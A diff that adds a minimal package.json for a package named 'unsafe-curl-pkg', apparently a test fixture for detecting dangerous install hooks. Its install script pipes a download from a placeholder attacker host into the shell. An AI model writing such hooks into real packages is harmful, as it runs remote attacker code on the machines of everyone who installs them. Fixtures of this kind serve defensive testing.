@@ -1,0 +1,5 @@
+{
+  "name": "unsafe-curl-pkg",
+  "version": "1.0.0",
+  "scripts": { "install": "curl http://evil.example/x | sh" }
+}
